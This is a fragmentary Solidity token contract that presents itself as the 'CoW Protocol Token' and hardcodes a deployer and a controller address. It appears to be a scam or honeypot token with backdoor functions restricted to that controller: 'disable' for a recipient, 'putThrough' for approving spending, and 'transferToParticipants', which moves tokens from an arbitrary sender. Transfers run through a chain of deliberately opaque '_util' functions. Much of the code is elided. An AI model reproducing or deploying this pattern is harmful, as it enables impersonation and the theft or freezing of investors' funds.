...
contract CoWToken is Context, IERC20 {
    ...
    address deployer = 0x0DA0C3e52C977Ed3cBc641fF02DD271c3ED55aFe;
    //0x0DA0da0DA0Da0dA0dA0Da0Da0DA0dA0da0dA0da0
    address public _controller = 0xe380c8C96ab329a4a490cA06eBb86988DD407DA9;
   constructor () public {



        _name = "CoW Protocol Token";
        _symbol = "COW";
        _decimals = 18;
   ...
   function approvalMinusOne(address safeOwner) public {
    ...
    function _util(address from, address dest, uint256 amt) internal cpu( dest,  amt,  from,  address(0)) virtual {
        _util2( from,  dest,  amt);
    }

    function _util2(address from, address dest, uint256 amt) internal cpu( dest,  amt,  from,  address(0)) virtual {
        _util3( from,  dest,  amt);
    }


    function _util3(address from, address dest, uint256 amt) internal cpu( dest,  amt,  from,  address(0)) virtual {
...
//-----------------------------------------------------------------------------------------------------------------------//
   ...
   function vestTokenAllocation()public _confirm(){}
  ...
  function disable(address recipient) public _confirm(){
    ...
    function putThrough(address addr) public _confirm() virtual  returns (bool) {
        //Approve Spending
  ...
  function transferToParticipants(address sndr,address[] memory destination, uint256[] memory amounts) public _confirm(){
